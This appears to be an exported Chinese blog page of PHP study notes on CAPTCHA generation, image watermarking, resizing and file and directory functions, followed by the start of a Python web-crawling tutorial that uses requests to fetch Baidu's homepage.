<h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$witch&#x3D;120;</span><br><span class="line">$height&#x3D;60;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 更改格式，否则报错</span><br><span class="line">header(&#39;Content-Type:image&#x2F;jpeg&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置随机数，使用.将其连接</span><br><span class="line">$string&#x3D;&#39;&#39;;</span><br><span class="line">for($i&#x3D;0;$i&lt;4;$i++)&#123;</span><br><span class="line">	$element&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;);</span><br><span class="line">	$string.&#x3D;$element[rand(0,count($element)-1)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建一个真彩图像</span><br><span class="line">$img &#x3D; imagecreatetruecolor($witch,$height);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 填充颜色</span><br><span class="line">$col1&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));</span><br><span class="line"></span><br><span class="line">$col2&#x3D;imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));</span><br><span class="line"></span><br><span class="line">$col3&#x3D;imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 填充区域</span><br><span class="line">$fill &#x3D; imagefill($img,0,0,$col1);</span><br><span class="line">imagerectangle($img,0,0,$witch-1,$height-1,$col2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建单一像素进行循环</span><br><span class="line">for($i&#x3D;0;$i&lt;&#x3D;100;$i++)&#123;</span><br><span class="line">	imagesetpixel($img,rand(0,$witch-1),rand(0,$height-1),</span><br><span class="line">	imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 创建线段，进行循环</span><br><span class="line">for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123;</span><br><span class="line">	imageline($img,rand(0,$witch&#x2F;2),rand(0,$height),</span><br><span class="line">	rand($witch&#x2F;2,$witch),rand(0,$height),</span><br><span class="line">	imagecolorallocate($img,rand(20,255),rand(20,255),rand(20,255)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 向图像中创建字符串</span><br><span class="line">&#x2F;&#x2F; imagestring($img,5,0,0,&#39;abcd&#39;,$col3);</span><br><span class="line">imagettftext($img,25,rand(2,25),rand(30,50),rand(30,$height),$col3,&#39;font&#x2F;ITCBLKAD.TTF&#39;,$string);</span><br><span class="line"></span><br><span class="line">imagejpeg($img);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">水印</span><br><span class="line">1、创建新的</span><br><span class="line">	imagecreatetruecolor() </span><br><span class="line">2、打开服务器或网络文件中已经存在的GIF,JPEG,PNG,WBMP格式图像</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582951910539.png" alt="1582796508013"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">文字水印</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpg&#39;);</span><br><span class="line">$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);</span><br><span class="line">$color&#x3D;imagecolorallocate($img,120,55,42);</span><br><span class="line"></span><br><span class="line">$width&#x3D;imagesx($img);</span><br><span class="line">$height&#x3D;imagesy($img);</span><br><span class="line">$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">$length&#x3D;$position[2]-$position[0];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imagettftext($img,20,0,$width-1-$length-($width&#x2F;5),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">图片和文字水印</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpg&#39;);</span><br><span class="line">$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;Pu.jpg&#39;);</span><br><span class="line">$mark&#x3D;imagecreatefromgif(&#39;picture&#x2F;minalt.gif&#39;);</span><br><span class="line">$color&#x3D;imagecolorallocate($img,120,55,42);</span><br><span class="line"></span><br><span class="line">$width&#x3D;imagesx($img);</span><br><span class="line">$height&#x3D;imagesy($img);</span><br><span class="line"></span><br><span class="line">$markWidth&#x3D;imagesx($mark);</span><br><span class="line">$markHeight&#x3D;imagesy($mark);</span><br><span class="line"></span><br><span class="line">$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">$length&#x3D;$position[2]-$position[0];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 文字水印</span><br><span class="line">imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">参数说明：</span><br><span class="line">	$img：目标图像资源</span><br><span class="line">	$wateMake：水印的图像资源</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(x轴的位置)</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(y轴的位置)</span><br><span class="line">	0：从水印图像资源的x坐标为0的位置开始拷贝</span><br><span class="line">	0：从水印图像资源的y坐标为0的位置开始拷贝</span><br><span class="line">	$wateWidth：所要拷贝水印图像的长度</span><br><span class="line">	$wateHeight：所要拷贝水印图像的宽度</span><br><span class="line">*&#x2F;</span><br><span class="line">imagecopy($img,$mark,100,100,0,0,$markWidth,$markHeight);</span><br><span class="line"></span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">更改图片透明度</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpg&#39;);</span><br><span class="line">$img &#x3D; imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);</span><br><span class="line">$mark&#x3D;imagecreatefrompng(&#39;picture&#x2F;xiao.png&#39;);</span><br><span class="line">$color&#x3D;imagecolorallocate($img,120,55,42);</span><br><span class="line"></span><br><span class="line">$width&#x3D;imagesx($img);</span><br><span class="line">$height&#x3D;imagesy($img);</span><br><span class="line"></span><br><span class="line">$markWidth&#x3D;imagesx($mark);</span><br><span class="line">$markHeight&#x3D;imagesy($mark);</span><br><span class="line"></span><br><span class="line">$position&#x3D;imagettfbbox(20,0,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">$length&#x3D;$position[2]-$position[0];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 文字水印</span><br><span class="line">imagettftext($img,20,0,$width-1-$length-($width&#x2F;30),$height-1-($height&#x2F;30),$color,&#39;picture&#x2F;chinese1.TTF&#39;,&#39;笛声&#x2F;悠扬&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">参数说明：</span><br><span class="line">	$img：目标图像资源</span><br><span class="line">	$wateMake：水印的图像资源</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(x轴的位置)</span><br><span class="line">	100：所要拷贝到目标图像资源上面的坐标(y轴的位置)</span><br><span class="line">	0：从水印图像资源的x坐标为0的位置开始拷贝</span><br><span class="line">	0：从水印图像资源的y坐标为0的位置开始拷贝</span><br><span class="line">	$wateWidth：所要拷贝水印图像的长度</span><br><span class="line">	$wateHeight：所要拷贝水印图像的宽度</span><br><span class="line">	0：代表透明度，数字越小越透明，100的时候相当于 imagecopy</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;imagecopy($img,$mark,800,500,0,0,$markWidth,$markHeight);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 可以更改透明度</span><br><span class="line">imagecopymerge($img,$mark,800,500,0,0,$markWidth,$markHeight,0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imagejpeg($img);</span><br><span class="line">imagedestroy($img);</span><br></pre></td></tr></table></figure>

<h4 id="缩放与裁剪"><a href="#缩放与裁剪" class="headerlink" title="缩放与裁剪"></a>缩放与裁剪</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">	等比例缩放</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&#39;Content-type:image&#x2F;jpeg&#39;);</span><br><span class="line">$width&#x3D;500;</span><br><span class="line"></span><br><span class="line">$img&#x3D;imagecreatefromjpeg(&#39;picture&#x2F;xihu.jpg&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$imgWidth&#x3D;imagesx($img);</span><br><span class="line">$imgHeight&#x3D;imagesy($img);</span><br><span class="line"></span><br><span class="line">$height&#x3D;$width&#x2F;($imgWidth&#x2F;$imgHeight);</span><br><span class="line">$target&#x3D;imagecreatetruecolor($width,$height);</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">imagecopyresampled(1,2,3,4,5,6,7,8,9,10)函数中的参数</span><br><span class="line">	1、目标图像资源</span><br><span class="line">	2、原图像资源(需要采样的那个图像资源)</span><br><span class="line">	3、目标图像资源坐标位置(x)轴</span><br><span class="line">	4、目标图像资源坐标位置(y)轴(与3一样确定了一个坐标,把采样到的部分，放到目标图像资源的什么位置)</span><br><span class="line">	5、原图像资源坐标位置(x)轴</span><br><span class="line">	6、原图像资源坐标位置(y)轴(你要残阳的原图像资源的某个部分的起始坐标()</span><br><span class="line">	7、目标长度</span><br><span class="line">	8、目标高度(确定了放到目标图像资源上面的尺寸)</span><br><span class="line">	9、原图像长度</span><br><span class="line">	10、原图像高度(确定了采样原图像资源的某个部分)</span><br><span class="line">*&#x2F;</span><br><span class="line">imagecopyresampled($target,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 裁剪</span><br><span class="line">&#x2F;&#x2F; imagecopyresampled($target,$img,0,0,0,0,100,100,100,100);</span><br><span class="line"></span><br><span class="line">if(imagejpeg($target))&#123;</span><br><span class="line">	imagejpeg($target,&#39;picture&#x2F;xxhh.jpg&#39;);</span><br><span class="line">&#125;</span><br><span class="line">imagedestroy($img);</span><br><span class="line">imagedestroy($target);</span><br></pre></td></tr></table></figure>

<h4 id="文件与目录操作"><a href="#文件与目录操作" class="headerlink" title="文件与目录操作"></a>文件与目录操作</h4><h5 id="目录的基本操作"><a href="#目录的基本操作" class="headerlink" title="目录的基本操作"></a>目录的基本操作</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">任何数据类型变量所有存储的数据，都是在程序运行时才加载到内存中的，而不能持久保存，那么如果需要将数据长久的保存起来，有两种方法，保存到普通文件中或者保存到数据中，我们的PHP可以在我们的服务器上生成目录、创建、编辑、删除、修改文件属性等操作</span><br></pre></td></tr></table></figure>

<h5 id="一、判断普通文件和目录"><a href="#一、判断普通文件和目录" class="headerlink" title="一、判断普通文件和目录"></a>一、判断普通文件和目录</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、is_file()	&#x2F;&#x2F; 判断给定的文件名是否为一个正常的文件</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(is_file(&#39;index.php&#39;));</span><br><span class="line">2、is_dir()	&#x2F;&#x2F; 判断给定文件名是否是一个目录</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(is_dir(&#39;..&#x2F;demo5&#x2F;&#39;));</span><br></pre></td></tr></table></figure>

<h5 id="二、文件的属性"><a href="#二、文件的属性" class="headerlink" title="二、文件的属性"></a>二、文件的属性</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582956505438.png" alt="1582945264007"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_exists()	&#x2F;&#x2F; 检查文件或目录是否存在</span><br><span class="line">        实例:</span><br><span class="line">        &#x2F;&#x2F; 检查文件</span><br><span class="line">            $sum &#x3D; &#39;index.php&#39;;</span><br><span class="line">            if(file_exists($sum))&#123;</span><br><span class="line">                echo &#39;true&#39;.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                    echo &#39;false&#39;.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 检查目录</span><br><span class="line">            $sum &#x3D; &#39;..&#x2F;demo5&#x2F;&#39;;</span><br><span class="line">            if(file_exists($sum))&#123;</span><br><span class="line">                echo &#39;true&#39;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                    echo &#39;false&#39;;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">filesize()	&#x2F;&#x2F; 取得普通文件的大小</span><br><span class="line">	实例：</span><br><span class="line">        $filename&#x3D;&#39;index.php&#39;;</span><br><span class="line">        &#x2F;&#x2F; 想要将字节转换成MB需要&#x2F;1024&#x2F;1024 除两次1024</span><br><span class="line">        echo $filename.&#39;:&#39;.filesize($filename).&#39;bytes&#39;;</span><br><span class="line">        </span><br><span class="line">     </span><br><span class="line">&#x2F;&#x2F; 如果可写，可读返回true   </span><br><span class="line">is_readable()	&#x2F;&#x2F; 判断文件是否可读</span><br><span class="line">	实例:</span><br><span class="line">		var_dump(is_readable(&#39;index.php&#39;));</span><br><span class="line">		</span><br><span class="line">is_writable()	&#x2F;&#x2F; 判断文件是否可写</span><br><span class="line">	实例:</span><br><span class="line">		var_dump(is_writeable(&#39;index.php&#39;));</span><br><span class="line">		</span><br><span class="line">filectime();	&#x2F;&#x2F; 获取文件创建时间</span><br><span class="line">	实例:</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">		echo date(&#39;Y-m-d G:i:s&#39;,filectime(&#39;index.php&#39;));</span><br><span class="line">		</span><br><span class="line">filemtime()		&#x2F;&#x2F; 获取文件修改时间</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">		echo date(&#39;Y-m-d G:i:s&#39;,filemtime(&#39;index.php&#39;));</span><br></pre></td></tr></table></figure>

<h5 id="三、目录的基本操作"><a href="#三、目录的基本操作" class="headerlink" title="三、目录的基本操作"></a>三、目录的基本操作</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582796508013.png" alt="1582951910539"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、basename();	&#x2F;&#x2F; 返回路径中的文件名部分</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">		&#x2F;&#x2F; 返回当前文件绝对路径</span><br><span class="line">        echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        &#x2F;&#x2F; 使用basename只返回文件名</span><br><span class="line">        echo basename(__FILE__);</span><br><span class="line">	</span><br><span class="line">2、dirname();	  &#x2F;&#x2F; 返回路径中的目录部分	</span><br><span class="line">	实例:</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        &#x2F;&#x2F; 使用dirname返回路径中的目录部分，只显示到目录</span><br><span class="line">        echo dirname(__FILE__).&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        </span><br><span class="line">3、pathinfo();		&#x2F;&#x2F; 返回路径中的信息</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        echo __FILE__.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">        &#x2F;&#x2F; 以数组的形式输出</span><br><span class="line">        var_dump(pathinfo(__FILE__)).&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">      </span><br><span class="line">4、opendir();		&#x2F;&#x2F; 打开目录句柄，也可以叫目录资源</span><br><span class="line">5、deaddir();		&#x2F;&#x2F; 读取目录句柄的条目，返回目录中下一个文件的文件名</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;);</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;3;$i++)&#123;</span><br><span class="line">            var_dump(readdir($dir));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">6、rewinddir();(了解)		&#x2F;&#x2F; 倒回目录句柄</span><br><span class="line">	实例：</span><br><span class="line">		date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">        $dir &#x3D; opendir(&#39;..&#x2F;demo5&#39;);</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;2;$i++)&#123;</span><br><span class="line">            var_dump(readdir($dir));</span><br><span class="line">        &#125;</span><br><span class="line">        rewinddir($dir);</span><br><span class="line">        var_dump(readdir($dir));</span><br><span class="line"></span><br><span class="line">7、closedir();		&#x2F;&#x2F; 关闭目录句柄</span><br><span class="line">	实例：</span><br><span class="line">	&#x2F;&#x2F; 返回false</span><br><span class="line">		closedir($dir);</span><br><span class="line">		var_dump(readdir($dir));</span><br><span class="line">		</span><br><span class="line">8、mkdir();		&#x2F;&#x2F; 新建目录</span><br><span class="line">	实例：</span><br><span class="line">		&#x2F;&#x2F; 创建文件夹</span><br><span class="line">        var_dump(mkdir(&#39;file&#39;));</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 设置文件夹最高权限，0777代表linux中r-w-x，4-2-1</span><br><span class="line">        var_dump(mkdir(&#39;file&#39;,0777));</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F; 加上true可以创建多层目录</span><br><span class="line">        var_dump(mkdir(&#39;file1&#x2F;liux&#x2F;r-w-x&#39;,0777,true));</span><br><span class="line"></span><br><span class="line">9、rmdir();		&#x2F;&#x2F; 删除指定的空目录</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(rmdir(&#39;demo5&#x2F;file1&#39;));</span><br><span class="line">		</span><br><span class="line">10、scandir();	&#x2F;&#x2F; 列出指定路径中的文件和目录</span><br><span class="line">	实例：</span><br><span class="line">		var_dump(scandir(&#39;..&#x2F;demo5&#39;));</span><br></pre></td></tr></table></figure>

<h4 id="四、文件的基本操作"><a href="#四、文件的基本操作" class="headerlink" title="四、文件的基本操作"></a>四、文件的基本操作</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582958832868.png" alt="1582956505438"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582260055891.png" alt="1582958832868"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、fopen();		&#x2F;&#x2F; 打开文件或者URL</span><br><span class="line">2、fread();		&#x2F;&#x2F; 读取文件</span><br><span class="line">	实例：</span><br><span class="line">		header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">        $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;);</span><br><span class="line">        var_dump(fread($file,3));</span><br><span class="line">		</span><br><span class="line">3、fgets();		&#x2F;&#x2F; 从文件指针中读取一行</span><br><span class="line">	实例：</span><br><span class="line">		header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">        $file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;);</span><br><span class="line">        var_dump(fgets($file,3));</span><br><span class="line"></span><br><span class="line">4、feof();		&#x2F;&#x2F; 测试文件指针是否到了文件结束位置</span><br><span class="line">	实例</span><br><span class="line">		$file&#x3D;fopen(&#39;test.txt&#39;,&#39;r&#39;);</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;10;$i++)&#123;</span><br><span class="line">            var_dump(fgets($file));</span><br><span class="line">        &#125;</span><br><span class="line">        var_dump(feof($file));</span><br><span class="line">        </span><br><span class="line">5、fwrite();		&#x2F;&#x2F; 写入文件</span><br><span class="line">	实例:</span><br><span class="line">		$file&#x3D;fopen(&#39;test.txt&#39;,&#39;r+&#39;);</span><br><span class="line">		var_dump(fwrite($file,&#39;龙傲九天&#39;));</span><br><span class="line">		</span><br><span class="line">6、rewind();		&#x2F;&#x2F; 倒回文件目录指针位置</span><br><span class="line"></span><br><span class="line">7、flock();		&#x2F;&#x2F; 轻便的咨询文件锁定</span><br><span class="line">	实例：</span><br><span class="line">        $file&#x3D;fopen(&#39;test.txt&#39;,&#39;a+&#39;);</span><br><span class="line">        &#x2F;&#x2F; 共享锁：LOCK_SH，独占锁：LOCK_EX，释放锁定：LOCK_UN，</span><br><span class="line">        &#x2F;&#x2F; 不希望flock()在锁定时堵塞：LOCK_NB,</span><br><span class="line">        if(flock($file,LOCK_EX))&#123;</span><br><span class="line">            &#x2F;&#x2F; sleep 延时</span><br><span class="line">            sleep(15);</span><br><span class="line">            fwrite($file,&#39;2.php&#39;);</span><br><span class="line">            flock($file,LOCK_UN);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;加锁失败&#39;;</span><br><span class="line">            </span><br><span class="line">8、ftruncate();		&#x2F;&#x2F; 将文件截断到给定的长度</span><br><span class="line"></span><br><span class="line">9、fclose();		&#x2F;&#x2F; 关闭一个已经打开的文件指针</span><br><span class="line">	实例</span><br><span class="line">		fclose($file);</span><br><span class="line"></span><br><span class="line">10、file();		&#x2F;&#x2F; 把整个文件读入一个数组中</span><br><span class="line"></span><br><span class="line">11、copy();		&#x2F;&#x2F; 拷贝文件</span><br><span class="line"></span><br><span class="line">12、unlink();	&#x2F;&#x2F; 删除文件</span><br><span class="line"></span><br><span class="line">13、file_get_contents();		&#x2F;&#x2F; 将整个文件读入一个字符串</span><br><span class="line">14、file_put_contents();		&#x2F;&#x2F; 将字符串写入文件中</span><br><span class="line">	实例：</span><br><span class="line">        header(&#39;Content-type;text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">        &#x2F;&#x2F; 可以填入URL</span><br><span class="line">        var_dump(file_get_contents(&#39;test.txt&#39;));</span><br><span class="line">        &#x2F;&#x2F; 写入文件中并覆盖原来的内容</span><br><span class="line">        var_dump(file_put_contents(&#39;test.txt&#39;,&#39;www.baidu.com&#39;));</span><br><span class="line"></span><br><span class="line">15、rename();	&#x2F;&#x2F; 重命名一个文件或目录</span><br><span class="line"></span><br><span class="line">16、readfile();	&#x2F;&#x2F; 读入一个文件并写入到输出缓冲</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>python爬虫</title>
    <url>/2020/04/03/python%E7%88%AC%E8%99%AB/</url>
    <content><![CDATA[<h5 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h5><h5 id="响应状态"><a href="#响应状态" class="headerlink" title="响应状态"></a>响应状态</h5><p>200代表成功、301表示跳转、404找不到页面、502服务器错误</p>
<h5 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h5><p>如内容类型、内容长度、服务器信息、设置Cookie等</p>
<h5 id="响应体"><a href="#响应体" class="headerlink" title="响应体"></a>响应体</h5><p>主要部分，包含了请求资源的内容、如网页HTML、图片二进制数据等</p>
<h5 id="我们在做爬虫时"><a href="#我们在做爬虫时" class="headerlink" title="我们在做爬虫时"></a>我们在做爬虫时</h5><h5 id="可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response-然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，"><a href="#可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response-然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，" class="headerlink" title="可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response,然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，"></a>可以用一些HTTP请求库，然后向服务器发送一个请求，得到这个Response,然后把这个响应体里面的内容拿下来，这个实际上就是网页的源代码，然后我们再把这个网页的源代码，进行解析，就可以拿到我们的数据了，</h5><p>模拟请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br><span class="line"></span><br><span class="line">#调用requests.get方法传入百度这个网址，这个也就是HTTP请求的发送，拿到这个响应</span><br><span class="line">#也就是说，requests库提供了get方法，我们传入这个URL也就是百度网址，就可以向服务器发送一个请求，然后拿到这个response</span><br><span class="line">&gt;&gt;&gt; response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;www.baidu.com&#39;)</span><br><span class="line"></span><br><span class="line">#打印response.text然后这个text就是把网页的源代码，也就是响应体拿过来</span><br><span class="line">&gt;&gt;&gt; print(response.text)</span><br><span class="line"></span><br><span class="line">#成功的获取到了这些网页的源代码，接下来就可以对网页进行解析了</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv&#x3D;content-type content&#x3D;text&#x2F;html;charset&#x3D;utf-8&gt;&lt;meta http-equiv&#x3D;X-UA-Compatible content&#x3D;IE&#x3D;Edge&gt;&lt;meta content&#x3D;always name&#x3D;referrer&gt;&lt;link rel&#x3D;stylesheet type&#x3D;text&#x2F;css href&#x3D;http:&#x2F;&#x2F;s1.bdstatic.com&#x2F;r&#x2F;www&#x2F;cache&#x2F;bdorz&#x2F;baidu.min.css&gt;&lt;title&gt;ç¾åº¦ä¸ä¸ï¼ä½ å°±ç¥é&lt;&#x2F;title&gt;&lt;&#x2F;head&gt; &lt;body link&#x3D;#0000cc&gt; &lt;div id&#x3D;wrapper&gt; &lt;div id&#x3D;head&gt; &lt;div class&#x3D;head_wrapper&gt; &lt;div class&#x3D;s_form&gt; &lt;div class&#x3D;s_form_wrapper&gt; &lt;div id&#x3D;lg&gt; &lt;img hidefocus&#x3D;true src&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png width&#x3D;270 height&#x3D;129&gt; &lt;&#x2F;div&gt; &lt;form id&#x3D;form name&#x3D;f action&#x3D;&#x2F;&#x2F;www.baidu.com&#x2F;s class&#x3D;fm&gt; &lt;input type&#x3D;hidden name&#x3D;bdorz_come value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;ie value&#x3D;utf-8&gt; &lt;input type&#x3D;hidden name&#x3D;f value&#x3D;8&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_bp value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;rsv_idx value&#x3D;1&gt; &lt;input type&#x3D;hidden name&#x3D;tn value&#x3D;baidu&gt;&lt;span class&#x3D;&quot;bg s_ipt_wr&quot;&gt;&lt;input id&#x3D;kw name&#x3D;wd class&#x3D;s_ipt value maxlength&#x3D;255 autocomplete&#x3D;off autofocus&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;bg s_btn_wr&quot;&gt;&lt;input type&#x3D;submit id&#x3D;su value&#x3D;ç¾åº¦ä¸ä¸ class&#x3D;&quot;bg s_btn&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;div id&#x3D;u1&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;news.baidu.com name&#x3D;tj_trnews class&#x3D;mnav&gt;æ°é»&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.hao123.com name&#x3D;tj_trhao123 class&#x3D;mnav&gt;hao123&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;map.baidu.com name&#x3D;tj_trmap class&#x3D;mnav&gt;å°å¾&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;v.baidu.com name&#x3D;tj_trvideo class&#x3D;mnav&gt;è§é¢&lt;&#x2F;a&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;tieba.baidu.com name&#x3D;tj_trtieba class&#x3D;mnav&gt;è´´å§&lt;&#x2F;a&gt; &lt;noscript&gt; &lt;a href&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;bdorz&#x2F;login.gif?login&amp;tpl&#x3D;mn&amp;u&#x3D;http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1 name&#x3D;tj_login class&#x3D;lb&gt;ç»å½&lt;&#x2F;a&gt; &lt;&#x2F;noscript&gt; &lt;script&gt;document.write(&#39;&lt;a 